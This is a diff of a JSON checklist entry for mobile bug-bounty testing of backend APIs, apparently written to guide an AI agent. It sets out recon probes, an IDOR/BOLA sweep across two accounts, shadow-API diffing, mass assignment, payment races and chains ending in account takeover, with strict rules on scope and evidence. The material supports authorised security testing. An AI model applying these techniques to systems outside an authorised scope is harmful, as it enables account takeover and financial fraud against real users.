@@ -4,11 +4,11 @@
  "file": "D15-backend-api-and-authz.md",
  "why": "Three independent sources in the corpus say the same thing without coordinating. Bugcrowd's own mobile\nguidance: *\"the network and server related vulnerabilities are where the higher impact vulnerabilities are\nfound.\"* The senior-researcher corpus: IDOR/BOLA through the mobile API is *\"consistently the best-paying\napp-layer class because impact is self-evident and server-side.\"* The MAS project concedes the same by\nomission — it has no client-side test for any of it. On a platform grid like YesWeHack's Gojek Android scope\n(Critical $3,500 / High $1,800 / Medium $600 / Low $50), a P5 mobile misconfiguration pays nothing and one\ncross-account read pays the top band.\n\nThe structural reason is specific and worth stating in the report: a mobile backend is usually an **older,\nless-reviewed second surface**. The app's hardcoded calls are frequently an older API version than the web\napp uses, kept alive because old installs must keep working, with weaker auth, weaker rate limits, weaker\ninput validation and more field exposure. Mobile builds are the number-one source of live legacy endpoints.\nThe bug is never \"there is a v1\" — a version difference alone is **Informational** — the bug is the\n*weakened control* you demonstrate on the old path with the same request, side by side. This is the highest\nvalue structural idea available on a mobile engagement and it is why D15 is worked from the endpoint map\nrather than from the proxy history.\n\nThe honest counterweight is false positives. This domain generates more retractions than any other, and all\nof them are avoidable: a 200 that contains your own session-scoped data, a hash differential that was an\nunordered collection serialised twice, a 400 \"field X is required\" that never passed the auth layer because a\nbody parser sits in front of it, a timing outlier that collapses at n=10, a status-code flip whose body is\nbyte-identical. The discipline items (D15-020 … D15-033) are not preamble — they are the difference between\neleven impact-demonstrated findings and thirteen of which two fall apart at triage. Run them first, and\nrecord the negatives they produce: *\"every invalid variant returns a byte-identical response, so injection at\nthis parameter is structurally ruled out\"* is a deliverable, not an absence of one.",
  "crux": "**For every object identifier and every security-relevant field the client is capable of sending, does the server re-derive the answer from its own state — or does it trust the identifier, the field, the version, the header or the client's arithmetic?**",
- "applicability": "D15 applies when the app talks, from its own process, to a backend the programme lets you test. Run these five before touching any item; paste their output into `inventory/d15-probe.txt`.\n\n```bash\n# 0. scope — the only question that can make the whole domain n/a on policy grounds\njq -r '.authorisation.scope.backend // \"unset\"' engagement.json          # in | out | pending | unset → unset means: read the policy now and write it\n# 1. does the client talk at all?\ngrep -c 'android.permission.INTERNET' \"$DEC/apktool/AndroidManifest.xml\"\n# 2. route / host / stack evidence from the decompiled tree\ngrep -rhoE '@(GET|POST|PUT|DELETE|PATCH|HTTP)\\(\"[^\"]+\"\\)' \"$DEC/jadx/sources\" | sort -u | wc -l                      # Retrofit routes\ngrep -rhoE 'https?://[A-Za-z0-9._-]+' \"$DEC/jadx/sources\" \"$DEC/apktool/res\" \"$DEC/apktool/assets\" | sort -u | wc -l   # host literals\nunzip -l base.apk | grep -cE 'libflutter|lib/.*/libapp\\.so|index\\.android\\.bundle|libhermes|assets/www'              # cross-platform stack (→ D15-007)\ngrep -rlE 'io\\.grpc|GeneratedMessageLite|CronetEngine' \"$DEC/jadx/sources\" | wc -l                                   # gRPC / protobuf-RPC / Cronet (→ D15-R02 branch, D15-009/010)\n# 3. who issues the traffic — the app's own PID or another process (D15-000)\nPID=$(adb -s \"$SERIAL\" shell pidof -s \"$PKG\"); adb -s \"$SERIAL\" shell 'ss -tnp' | grep -c \"pid=$PID,\"\n# 4. the AM-05 half of the chapter needs two owned accounts\njq -r '.accounts | length' engagement.json\n```\n\nDecision: the domain applies if probe 0 is `in` **and** probe 1 ≥ 1 **and** (any of the probe-2 counts > 0) **and** probe 3 ≥ 1. If probe 4 < 2 the two-account items (`Requires: two-accounts`) are **blocked** (write the blocker), not n/a. If probe 0 is `pending`, run only D15-000/001/007 (static, no requests), timestamp every other sweep and keep per-sweep flow files (`mitmdump -w +flows/<item>-<ts>.mitm`).\n\nn/a note the model writes, verbatim shape:\n\n> D15 n/a — reason: (a) programme policy excludes backend/server-side services (quote + URL; `authorisation.scope.backend=out`), or (b) the client has no network surface (`INTERNET` absent / 0 routes, 0 hosts, no cross-platform stack, 0 RPC classes — probe output attached), or (c) every TLS socket in the exercise window belongs to another process (`ss -tnp` + User-Agent table from D15-000 attached) and that service is outside scope. Items D15-001..D15-090 marked n/a with this probe at `inventory/d15-probe.txt`; proxy capture retained at `flows/` for re-reading if scope changes.",
- "triage": "1. **The cross-boundary curl check (D15-021).** Two minutes, and it decides the shape of the entire phase: if\n   the token works off-device the whole sweep is scriptable; if it does not, you test through the app.\n2. **Build the endpoint map from the binary (D15-001 … D15-011).** The proxy shows what the UI happened to\n   exercise; the binary shows everything the client *can* call. Working from proxy history alone is the single\n   biggest coverage failure in this domain.\n3. **The two-account BOLA sweep, read then write separately (D15-034, D15-035).** Highest yield, and the read\n   vs write distinction spans P3 to P1 — get it right before anything else.\n4. **Mobile-only, legacy-version and role-crossing routes (D15-012, D15-013, D15-017, D15-061, D15-062).** The\n   shadow-API delta is where a well-tested web API still bleeds.\n5. **Mass assignment from the DTOs (D15-004, D15-064 … D15-066).** The model classes hand you the exact wire\n   names; guessing field names produces noise.\n6. **Business logic and races on money (D15-076 … D15-085).** Lowest duplication rate in the whole checklist —\n   scanners cannot find these — but they demand ledger-state proof, not a 200.\n7. **Rate limiting and enumeration (D15-086, D15-087).** Cheap, and the mobile-vs-web contrast is the\n   report's strongest sentence.\n8. **Everything else only after the discipline items have produced a documented baseline.** A differential you\n   cannot defend is worse than no differential.",
+ "applicability": "D15 applies when the app talks, from its own process, to a backend the programme lets you test. Run these five before touching any item; paste their output into `inventory/d15-probe.txt`.\n\n```bash\n# 0. scope — the only question that can make the whole domain n/a on policy grounds\njq -r '.authorisation.scope.backend // \"unset\"' engagement.json          # in | out | pending | unset → unset means: read the policy now and write it\n# 1. does the client talk at all?\ngrep -c 'android.permission.INTERNET' \"$DEC/apktool/AndroidManifest.xml\"\n# 2. route / host / stack evidence from the decompiled tree\ngrep -rhoE '@(GET|POST|PUT|DELETE|PATCH|HTTP)\\(\"[^\"]+\"\\)' \"$DEC/jadx/sources\" | sort -u | wc -l                      # Retrofit routes\ngrep -rhoE 'https?://[A-Za-z0-9._-]+' \"$DEC/jadx/sources\" \"$DEC/apktool/res\" \"$DEC/apktool/assets\" | sort -u | wc -l   # host literals\nunzip -l base.apk | grep -cE 'libflutter|lib/.*/libapp\\.so|index\\.android\\.bundle|libhermes|assets/www'              # cross-platform stack (→ D15-007)\ngrep -rlE 'io\\.grpc|GeneratedMessageLite|CronetEngine' \"$DEC/jadx/sources\" | wc -l                                   # gRPC / protobuf-RPC / Cronet (→ D15-007 RPC branch, D15-009/010)\n# 3. who issues the traffic — the app's own PID or another process (D15-091)\nPID=$(adb -s \"$SERIAL\" shell pidof -s \"$PKG\"); adb -s \"$SERIAL\" shell 'ss -tnp' | grep -c \"pid=$PID,\"\n# 4. the AM-05 half of the chapter needs two owned accounts\njq -r '.accounts | length' engagement.json\n```\n\nDecision: the domain applies if probe 0 is `in` **and** probe 1 ≥ 1 **and** (any of the probe-2 counts > 0) **and** probe 3 ≥ 1. If probe 4 < 2 the two-account items (`Requires: two-accounts`) are **blocked** (write the blocker), not n/a. If probe 0 is `pending`, run only D15-091/001/007 (static, no requests), timestamp every other sweep and keep per-sweep flow files (`mitmdump -w +flows/<item>-<ts>.mitm`).\n\nn/a note the model writes, verbatim shape:\n\n> D15 n/a — reason: (a) programme policy excludes backend/server-side services (quote + URL; `authorisation.scope.backend=out`), or (b) the client has no network surface (`INTERNET` absent / 0 routes, 0 hosts, no cross-platform stack, 0 RPC classes — probe output attached), or (c) every TLS socket in the exercise window belongs to another process (`ss -tnp` + User-Agent table from D15-091 attached) and that service is outside scope. Items D15-001..D15-090 marked n/a with this probe at `inventory/d15-probe.txt`; proxy capture retained at `flows/` for re-reading if scope changes.",
+ "triage": "0. **The scope decision.** Read the programme policy for backend/server-side services and write\n   `authorisation.scope.backend = in|out|pending` into `engagement.json` before any request leaves the proxy.\n   `out` → every D15 item is n/a with the Applicability-probe note; `pending` → write the blocker in\n   `engagement.json.blockers`, keep D15-091/D15-001/D15-007 (static inventory, no requests) and record every\n   client-side sweep's start/end timestamp so its proxy window can be re-read later\n   (`mitmdump -w +flows/<domain>-<item>-<ts>.mitm` per sweep, never one shared file).\n1. **The cross-boundary curl check (D15-021).** Two minutes, and it decides the shape of the entire phase: if\n   the token works off-device the whole sweep is scriptable; if it does not, you test through the app.\n2. **Build the endpoint map from the binary (D15-001 … D15-011).** The proxy shows what the UI happened to\n   exercise; the binary shows everything the client *can* call. Working from proxy history alone is the single\n   biggest coverage failure in this domain.\n3. **The two-account BOLA sweep, read then write separately (D15-034, D15-035).** Highest yield, and the read\n   vs write distinction spans P3 to P1 — get it right before anything else.\n4. **Mobile-only, legacy-version and role-crossing routes (D15-012, D15-013, D15-017, D15-061, D15-062).** The\n   shadow-API delta is where a well-tested web API still bleeds.\n5. **Mass assignment from the DTOs (D15-004, D15-064 … D15-066).** The model classes hand you the exact wire\n   names; guessing field names produces noise.\n6. **Business logic and races on money (D15-076 … D15-085).** Lowest duplication rate in the whole checklist —\n   scanners cannot find these — but they demand ledger-state proof, not a 200.\n7. **Rate limiting and enumeration (D15-086, D15-087).** Cheap, and the mobile-vs-web contrast is the\n   report's strongest sentence.\n8. **Everything else only after the discipline items have produced a documented baseline.** A differential you\n   cannot defend is worse than no differential.",
  "graveyard": "| Observation | Why it is not a finding | What would make it one |\n|---|---|---|\n| GraphQL introspection enabled | `sensitive_data_exposure.graphql_introspection_enabled` is **P5**, and \"introspection alone\" is on the never-submit list | A specific undocumented mutation reached from a low-privilege session, or a field-level authz failure found via the schema (D15-072) |\n| `{\"data\":{\"__schema\":null}}` reported as \"introspection enabled\" | `null` means **disabled** — not \"worked but empty\" | Nothing; re-test with suggestions and the APK operation documents instead |\n| A 200 OK returned for another user's id | \"200 OK without actually leaked data\" is the single biggest N/A driver on H1/Bugcrowd; the body may be empty, may be your own session-scoped data, may be a cached impersonation response, or may be fields already public on the profile page | The second account's 8+ char marker present in the response and absent from the baseline (D15-029) |\n| A 403→200 flip whose body is byte-identical | The edge normalised your input; the Body-Diff Rule says a byte-identical 200 is not a bypass | A body differential, with the changed bytes identified |\n| `400 \"field X is required\"` from an unauthenticated request | A body parser or sanitiser may sit in front of the auth middleware — the layer-ordering trap | The same route still returning the field error for a minimal well-formed `{}` body (D15-024) |\n| \"The API version v1 still exists\" | A version difference alone is **Informational** | A demonstrated regression on the old path: weaker auth, missing 429, weaker validation, or extra fields (D15-013) |\n| A negative price accepted in the cart | Many cart APIs accept arbitrary client state while payment capture rejects it — the cart display is fiction | The credit settling as wallet balance, store credit or a refund to your payment instrument (D15-076) |\n| A discount shown as `-$50.00` in the cart | Systems commonly cap the applied discount at 100%: captured payment `$0.00`, no refund issued | The captured payment or the issued refund reflecting the stacked discount (D15-078) |\n| 100 aliased mutations all returning `success:true` | Apollo/GraphQL-Ruby/Graphene resolve aliases **sequentially**; this is quota enforcement, not a race | Server state showing N applied benefits, or a true parallel single-packet race (D15-085) |\n| A single slow response for a valid username | Network jitter routinely produces 2× outliers | n ≥ 10 interleaved trials with the suspect mean ≥ 2σ above control (D15-030) |\n| An md5 differential across identical requests | Unordered collections serialise differently: same set, same length, different hash | The differential surviving normalisation (sorted arrays, volatile keys stripped) (D15-025) |\n| A uniform 401 on every endpoint from curl | Usually a stale `__cf_bm`-class bot cookie or a duplicated cookie row, not a revoked session | The same request failing when issued by the app itself (D15-028) |\n| A zero-byte 4xx body (md5 `d41d8cd9…`) | Edge/protocol rejection — HTTP header values are ISO-8859-1, so unicode payloads die at the proxy | An origin response with a body |\n| A \"file existence oracle\" on a blocked extension | A fixed deny-list is a server policy, not a state oracle | The differentiator tracking a value that cannot exist in the dataset (D15-031) |\n| Client-sent `finalCustomerAmount` / `senderId` in the request body | A client-sent security value is an **enabling condition**; the server may recompute from the cart session | The server honouring the tampered value in the persisted object, read back with a separate GET (D15-004, D15-076) |\n| OAuth `client_secret` found in the APK | Known and expected for a public client — on the never-submit list | PKCE non-enforcement at the token endpoint, which is the reportable finding (→ D13) |\n| SSRF confirmed by a DNS callback only | \"SSRF DNS callback only\" is on the never-submit list | Cloud metadata or an internal admin API reached, with content returned or exfiltrated OOB (D15-081) |\n| No certificate pinning on the API host | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` is **P5**; once you decrypt, pinning is irrelevant to severity | Nothing on its own — it is the harness, not the finding (→ D14) |\n| \"No application-layer payload encryption\" | A MAS-R resilience control (MASWE-0062); Informational on most programs | Whatever you achieve once inside it — a tampered amount or object id accepted (D15-084) |\n| A mobile-only endpoint that exists | Enumeration is Support, not a finding | The missing authorisation, missing throttle or extra fields demonstrated on it (D15-012) |\n| A UUID-keyed IDOR with no leak path | Defaults to P4 and `AC:H`; some programs exclude UUID-dependent access control outright | An in-app, repeatable method to obtain the specific ids — another API response, a share link, a push payload, a provider row (D15-039) |\n| Admin-only data returned to every client but hidden in the UI | Rated as privilege escalation, and often only Medium | Showing the value is used as a credential, or that it unlocks an action the role cannot perform (D15-046) |",
  "joins": "- **D10/D11/D07/D20 (any token-leak primitive) × D15-021 — the cross-boundary join.** A bridge that returns\n  the session header, a world-readable `shared_prefs` blob, a provider row or a logcat line is **Informational\n  until you replay it**. The join nobody runs is the two-minute curl check: move the token to a host that never\n  ran the app and strip the device header. A leaked token that works from anywhere is\n  `broken_authentication_and_session_management.authentication_bypass` (P1); the same leak with a genuinely\n  sender-constrained token is a P5 storage note. File the storage primitive first, then the server-side\n  consumer, then link them.\n- **D07 provider rows / D09 deep-link parameters / D24 push payloads × D15-039 — the AC:H join.** The\n  HackerOne standard sets `AC:H` on a UUID-keyed IDOR by default and drops it to `AC:L` when you demonstrate a\n  reliable way to obtain the ids. Nobody reviews the exported-provider table and the API's object-id space\n  together — but an exported provider that hands out server object ids is exactly that demonstration, and it\n  moves the same bug two VRT bands.\n- **D01 binary inventory × the live web API — the shadow-API join.** The app's hardcoded endpoints are\n  frequently an older API version than the web app uses. Diff the *behaviour* (auth strength, 429, validation,\n  field exposure) rather than the response shape, for the same operation. The version difference is\n  Informational; the weakened control is the finding, and it is the single highest-value structural move\n  available on a mobile engagement.\n- **D21 attestation × every \"requires a modified client\" caveat.** Vendors downgrade findings by asserting that\n  root detection or Play Integrity prevents exploitation. D15-084 answers that in one request: if the server\n  accepts the call with the verdict stripped or replayed, every such caveat evaporates and each affected\n  finding must be re-rated upward. Test the attestation *before* you accept a downgrade, not after.\n- **D12 hardcoded keys × D15-076/D15-081 — the signed-request join.** An HMAC key recovered from the binary\n  turns \"the request is signed, so it cannot be tampered\" into a price-tampering and webhook-forgery primitive.\n  The crypto team reviews the key; the API team reviews the endpoint; nobody joins them.\n- **D18 storage buckets / CDN × D15-047 and D15-088.** A pre-signed media URL, a subdomain takeover on an\n  allow-listed CORS origin, and an unauthenticated CDN path for private documents are three surfaces owned by\n  three different teams. Together they are unauthenticated bulk retrieval of KYC documents from a page the\n  attacker controls.\n- **D11 offline queue × D15-080.** Offline-first apps persist pending mutations locally and replay them on\n  reconnect. Editing the queued transition on disk delivers an out-of-order or forged state change through a\n  path the UI never shows and the server treats as first-party — the state-machine bug with a local delivery\n  vehicle.\n- **D10 WebView × D15-046/D15-064 — the stored-payload join.** A profile field the API lets you write\n  (sometimes keyed only on a non-secret identifier) rendered by a first-party WebView that carries a bridge is\n  the cleanest full chain in mobile: weak API authorisation → stored XSS on a trusted origin → bridge → token →\n  ATO. Test every free-text field the API accepts against every screen that renders server-supplied HTML.\n- **D13 OTP/session × D15-086/D15-087 — the chain that must be filed as one.** Enumeration gives the target\n  list, the missing mobile-side rate limit gives the attempts, and a 4–6 digit OTP gives the takeover. Filed\n  separately they are P4, P4 and \"expected\"; filed as one chain with the arithmetic, it is an authentication\n  bypass.\n- **D23 payments × D15-085.** The payments team tests the happy path and the fraud engine; nobody fires 30\n  single-packet requests at the top-up, referral-credit or scratch-card endpoints that exist only in the mobile\n  client. Those are the \"you may do this once\" controls with no lock.",
- "sources": "- **Mandatory read — `secondary/claude-bughunter.md`** (mined from a 4,467-star bug-hunting corpus): the\n  layer-ordering trap; marker discipline, the Body-Diff Rule, the Statistical-Sample Rule,\n  Server-Policy-vs-State and the Shell-Loop Ban; the shadow-API behavioural-diff method and its severity table;\n  the mobile auth specifics (client-only rate limits, PKCE non-enforcement as the reportable finding rather\n  than the `client_secret`); the five-screenshot evidence pattern and PII-masking split; the pre-severity gate\n  run against the Critical claim, retraction-appendix discipline and the do-not-retract-on-mid-engagement-patch\n  rule; chain-filing order; the GraphQL pattern library (Relay `node()`, field-level authz, alias batching and\n  its race correction, APQ fallback, operation-type confusion, mutation-over-GET); business-logic patterns\n  (negative price, currency swap, step-skip, cart TOCTOU, webhook replay, coupon/referral, bulk-action gap,\n  soft-delete persistence); OData `$filter`/`$orderby`/`$expand`; server-side prototype pollution and SSPP.\n- **`frontier/api-and-server-side.md`**: the Retrofit/R8 annotation-survival method and the endpoint,\n  parameter, `@Url`, interceptor and OkHttp-tap recovery chain; gRPC/grpcurl and blackbox protobuf; the\n  version-ladder and app-version-header downgrade; the two-account BOLA sweep with negative control; the\n  single-account checks; mass assignment from DTOs and at registration; BFLA; price/quantity/currency/coupon/\n  referral/workflow items; the single-packet race and Turbo Intruder gate; rate limiting (NIST SP 800-63B\n  §5.2.2) and its bypasses; the non-determinism, error-oracle and validation-signature discipline; Autorize;\n  bulk/sync endpoints; pre-signed URLs; CORS; content-type and method manipulation; idempotency and replay; and\n  the cross-boundary curl check with RFC 9449 DPoP.\n- **`local/skill-corpus-method.md` and `local/skill-corpus-classes.md`** (senior-researcher corpus): the\n  endpoint-table shape and the `1.0/payment-aggregator/users/bank-details/{userId}` flagship candidate; the\n  `OrderRequestBody` worked example; \"client-sent security values are enabling conditions, not bugs\"; the\n  two-tester-owned-accounts boundary and the no-scanners rule of engagement; the four layer-attribution\n  misreads (zero-byte body, stale `__cf_bm`, duplicate cookie rows, 429 contamination); the API-authz\n  SUSPECTED/NEEDS-VERIFICATION reporting discipline; and the \"cross the trust boundary\" escalation axis.\n- **OWASP** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`): the MASTG coverage gap for\n  server-side authorisation, stated explicitly; MASTG-TEST-0392/-0382 enforced updating, MASTG-TEST-0338\n  storage-integrity, MASWE-0062 payload encryption, MASWE-0018, MASTG-TECH-0022/-0011/-0012/-0010/-0043;\n  API1–API10:2023 with their documented scenarios (the VIN BOLA, `total_stay_price`, `blocked:false`,\n  `deleteReports`, `reportUser`, the referral-credit API6 scenario, the beta-environment API9 scenario);\n  Mobile Top 10 2024 M3/M4/M8; WSTG-BUSL-01 … -06.\n- **Bugcrowd VRT 2026-07-08 and program economics** (`primary/bugcrowd-vrt-severity.md`,\n  `primary/vrp-program-economics.md`): the P1/P2/P3/P4/P5 IDOR fork on view-vs-modify and iterable-vs-GUID\n  (CWE-932); `broken_access_control.privilege_escalation` as VARIES; `server_security_misconfiguration.race_condition`;\n  the no-rate-limiting and username-enumeration nodes; `exposed_portal.admin_portal`; the HackerOne Platform\n  Standards AC:H/AC:L rule for unpredictable ids (effective 2 April 2024, updated 20 January 2026) and the\n  \"stop as soon as PII is exposed\" instruction; Spotify's UUID exclusion; Airbnb's named mobile-API scope;\n  Google's exclusion of backend services from its Android programs.\n- **Disclosed reports** (`realworld/h1-disclosed-mobile.md`, `realworld/bugcrowd-intigriti-writeups.md`,\n  `secondary/writeups-realfinds.md`, `secondary/sehno-gowthams.md`): H1 #186279, #754044, #203042, #757095,\n  #753280, #221558, #1080901, #447975, #479139, #1819832, #1213237, #743953, #3124517, #394329, #415081,\n  #2032716, #981472, #1066203, #1618347, #807448, #489146, #2207248, #3287208, #1849626, #759247, #429026,\n  #300305, #2110030, #1438052, #1520931, #2078571, #119657, #307239, #1295844, #1543159, #894569, #486629; the\n  Cobalt undisclosed-endpoint case study; the SirBugs unauthenticated CRM `hard_id` write that opened a\n  four-bug ATO chain; the Voorivex unauthenticated internal SMS service.\n- **`gaps-gap-coverage.md` and `gaps-gap-adversary.md`**: the surfaces no checklist carries — the search/\n  autocomplete PII oracle, client-timestamp sync conflict resolution, the GDPR export job and artefact, support\n  ticket/message/attachment ids tested separately, KYC document IDOR and re-upload overwrite, client-asserted\n  KYC status, notification-preference cross-user writes, push/device registration BOLA and FCM topic\n  namespaces.\n- **`frontier/modern-api-surfaces.md`, `frontier/undertested-surfaces.md`, `realworld/crossplatform-frameworks.md`,\n  `architecture/aosp-core.md`, `secondary/frida-drozer-tooling.md`, `secondary/hrishikesh-hacktricks.md`,\n  `secondary/indusface-singh-riya.md`, `secondary/sallam-hetmehta.md`, `primary/mitre-attack-mobile.md`,\n  `primary/exploitdb-cve-patterns.md`, `primary/mobilehackinglab.md`**: Play Integrity's four server-side\n  baseline checks, `requestHash` content binding and the SafetyNet January-2025 turndown; companion-surface and\n  retired-Instant-App endpoints; cross-platform bundle endpoint extraction; device identifiers used as\n  authorisation; the Frida request-tampering and heap-evaluate technique; the \"run the full web checklist once\n  traffic is visible\" framing; the `@SerializedName` mass-assignment oracle; ATT&CK T1428/T1641/T1633.001/\n  T1630.003/T1636.004 and M1002; CVE-2015-7889 (EDB 38558) sequential message ids; and the MHL pre-confirmation\n  leak with its enumeration-cost severity calibration.",
+ "sources": "- **OWASP**: the MASTG coverage gap for server-side authorisation, stated explicitly; MASTG-TEST-0392/-0382\n  enforced updating, MASTG-TEST-0338 storage-integrity, MASWE-0062 payload encryption, MASWE-0018,\n  MASTG-TECH-0022/-0011/-0012/-0010/-0043; API1–API10:2023 with their documented scenarios (the VIN BOLA,\n  `total_stay_price`, `blocked:false`, `deleteReports`, `reportUser`, the referral-credit API6 scenario, the\n  beta-environment API9 scenario); Mobile Top 10 2024 M3/M4/M8; WSTG-ATHZ-02/-04, WSTG-ERRH-01, WSTG-BUSL-01 …\n  -06; OWASP LLM Top 10 2025 (LLM06/LLM07/LLM10) for the model-proxy item.\n- **Bugcrowd VRT 2026-07-08 and programme economics**: the P1/P2/P3/P4/P5 IDOR fork on view-vs-modify and\n  iterable-vs-GUID (CWE-932); `broken_access_control.privilege_escalation` as varies;\n  `server_security_misconfiguration.race_condition`; the no-rate-limiting and username-enumeration nodes;\n  `exposed_portal.admin_portal`; `disclosure_of_secrets.pay_per_use_abuse`; the HackerOne Platform Standards\n  AC:H/AC:L rule for unpredictable ids (effective 2 April 2024, updated 20 January 2026) and the \"stop as soon\n  as PII is exposed\" instruction; programme policies that exclude UUID-dependent access-control issues, that\n  name a mobile-API scope explicitly, and that exclude backend services from an Android programme — the reason\n  Triage order step 0 exists.\n- **Disclosed reports** (HackerOne): #186279, #754044, #203042, #757095, #753280, #221558, #1080901, #447975,\n  #479139, #1819832, #1213237, #743953, #3124517, #394329, #415081, #2032716, #981472, #1066203, #1618347,\n  #807448, #489146, #2207248, #3287208, #1849626, #759247, #429026, #300305, #2110030, #1438052, #1520931,\n  #2078571, #119657, #307239, #1295844, #1543159, #894569, #486629; the public undisclosed-endpoint case study;\n  the unauthenticated CRM `hard_id` write that opened a four-bug ATO chain; the unauthenticated internal SMS\n  service.\n- **Discipline items (D15-022 … D15-033)**, distilled from public bug-hunting methodology: the layer-ordering\n  trap; marker discipline, the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the\n  Shell-Loop Ban; the shadow-API behavioural-diff method and its severity table; client-only rate limits and\n  PKCE non-enforcement as the reportable finding rather than the `client_secret`; the five-screenshot evidence\n  pattern and PII-masking split; the pre-severity gate run against the Critical claim, retraction-appendix\n  discipline and the do-not-retract-on-mid-engagement-patch rule; chain-filing order; the four\n  layer-attribution misreads (zero-byte body, stale bot-management cookie, duplicate cookie rows, 429\n  contamination); \"client-sent security values are enabling conditions, not bugs\"; the two-tester-owned-accounts\n  boundary and the no-scanners rule of engagement.\n- **PortSwigger research**: \"Smashing the state machine\" (the single-packet race and the Turbo Intruder gate);\n  access-control and API-testing research (parameter pollution, array-wrap, hidden ownership fields); the\n  GraphQL pattern library (Relay `node()`, field-level authz, alias batching and its race correction, APQ\n  fallback, operation-type confusion, mutation-over-GET); web cache deception; server-side prototype pollution\n  and server-side parameter pollution.\n- **Standards and vendor documentation**: NIST SP 800-63B §5.2.2 (rate limiting); RFC 9449 (DPoP); RFC 9562\n  (UUID versions, obsoletes RFC 4122); Google Play Integrity documentation (`requestHash`, the four server-side\n  baseline checks, the SafetyNet January-2025 turndown); the Firebase Cloud Messaging topic-management API\n  (server credential required since the legacy server-key shutdown); OData `$filter`/`$orderby`/`$expand`.\n- **Business-logic patterns** (public write-ups): negative price, currency swap, step-skip, cart TOCTOU, webhook\n  replay, coupon/referral, bulk-action gap, soft-delete persistence; the search/autocomplete PII oracle,\n  client-timestamp sync conflict resolution, the GDPR export job and artefact, support ticket/message/attachment\n  ids tested separately, KYC document IDOR and re-upload overwrite, client-asserted KYC status,\n  notification-preference cross-user writes, push/device registration BOLA and FCM topic namespaces.\n- **Engagement-derived additions (2026-10, generalised — no target named)**: process attribution of backend\n  flows (D15-091), the compiled-in environment selector (D15-092), realtime channel authorisation (D15-093),\n  model-proxy metering and tool authorisation (D15-094), Host/SNI routing on the shared edge (D15-095),\n  pagination cursors carrying the filter (D15-096), batch envelopes (D15-097); the protobuf-RPC route branch\n  (D15-007), the flow-driven protobuf replay (D15-010), the encoding-layer variant of the layer-ordering trap\n  (D15-024), the bearer-by-design amplifier note (D15-021), per-device feature-flag tables (D15-062), and the\n  per-run flow-file rule (D15-006).\n- **ATT&CK and CVE patterns**: ATT&CK T1428/T1641/T1633.001/T1630.003/T1636.004 and mitigation M1002;\n  CVE-2015-7889 (EDB 38558) sequential message ids; the pre-confirmation leak with its enumeration-cost\n  severity calibration; the `@SerializedName` mass-assignment oracle; companion-surface and\n  retired-Instant-App endpoints; cross-platform bundle endpoint extraction; device identifiers used as\n  authorisation; the Frida request-tampering and heap-evaluate technique.",
  "intro": "> This is the server-side half of a mobile engagement: the endpoint map you recover from the client, and every\n> authorisation, binding and business-rule decision the backend makes about requests that map produces. Unlike\n> every client-side domain, nothing here is pinned to P5 — the ceiling is a genuine **P1**\n> (`broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers`), and on most\n> engagements this domain carries the Criticals on its own.\n\n| | |\n|---|---|\n| **Phases** | P6 network & backend API (the sweep), P7 chaining & escalation (composing a read-IDOR into ATO/money/privilege) |\n| **Milestones** | M6, M7 |\n| **VRT ceiling** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (**P1**); also reachable at P1: `broken_authentication_and_session_management.authentication_bypass`, `server_security_misconfiguration.exposed_portal.admin_portal`, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`. Write-only IDOR is P2 (`.modify_sensitive_information_iterable_object_identifiers`), read-only P3 (`.view_sensitive_information_iterable_object_identifiers`), GUID-keyed P4 (`.modify_view_sensitive_information_guid`), non-sensitive P5 (`.view_non_sensitive_information`). Business logic has **no VRT leaf** — carry it with CVSS and the money |\n| **Primary attacker model** | **AM-05** another user of the same app (the two-owned-account cross-account matrix). **AM-01** remote no interaction for unauthenticated/mobile-only/legacy routes. AM-02 for the CORS and mutation-over-GET variants. AM-12 (own rooted device) is the *harness*, never the attack — every finding here must reproduce from `curl` on a machine that never ran the app |\n| **Maps to** | MASVS-AUTH-1, MASVS-CODE-2, MASVS-CODE-4, MASVS-RESILIENCE-3; MASTG-TECH-0022, -0011, -0012, -0010, -0043, -0008; MASTG-TEST-0392, -0382, -0338, -0237, -0238, -0236, -0217, -0002 (deprecated); MASWE-0018 (CWE-862, CWE-863), MASWE-0043, MASWE-0057, MASWE-0062, MASWE-0050 (CWE-20, CWE-89, CWE-116); MASTG-KNOW-0023, MASTG-KNOW-0036, MASTG-BEST-0066, MASTG-TOOL-0125. **MASTG has no Android test for IDOR/BOLA, mass assignment, rate limiting or server-side authorisation — the MAS project scopes itself to the client. That is a known gap, not a low priority.** OWASP API Security Top 10 2023 API1, API2, API3, API4, API5, API6, API7, API8, API9, API10; OWASP Mobile Top 10 2024 M3, M4, M8; WSTG-BUSL-01 … -06; CWE-932 (the VRT `idor` node), CWE-269, CWE-862, CWE-863, CWE-306, CWE-20; ATT&CK T1428 Exploitation of Remote Services, T1641 / T1641.001 Data Manipulation, T1643, T1633.001, T1630.003, T1636.004, T1426, mitigation M1002 Attestation |",
  "domain_meta": {
   "Phases": "P6 network & backend API (the sweep), P7 chaining & escalation (composing a read-IDOR into ATO/money/privilege)",
@@ -35,8 +35,10 @@
     "AM-12"
    ],
    "applies_to": "Java/Kotlin apps using Retrofit (the dominant Android HTTP stack)",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API9:2023 Improper Inventory Management; MASTG-TECH-0022",
    "record": "",
    "legacy_meta": {},
@@ -52,21 +54,28 @@
     "vrt": []
    },
    "xrefs": [
+    "D01-058",
+    "D15-002",
     "D15-004",
     "D15-006",
     "D15-007",
-    "D15-034"
+    "D15-023",
+    "D15-032",
+    "D15-034",
+    "D15-061",
+    "D15-091"
    ],
    "domain_refs": [
+    "D01",
     "D18"
    ],
    "has_code": true,
    "skip_when": "",
-   "test": "Recover every server route the app is capable of calling. R8/ProGuard renames classes and methods\nbut **does not rewrite the string values inside runtime-visible annotations** — Retrofit needs those strings\nat runtime to build the request line, so `@GET(\"v2/users/{id}/wallet\")` survives minification verbatim even\nwhen the interface is renamed to `a.b.c`. \"The build is obfuscated\" is never a reason to skip this.",
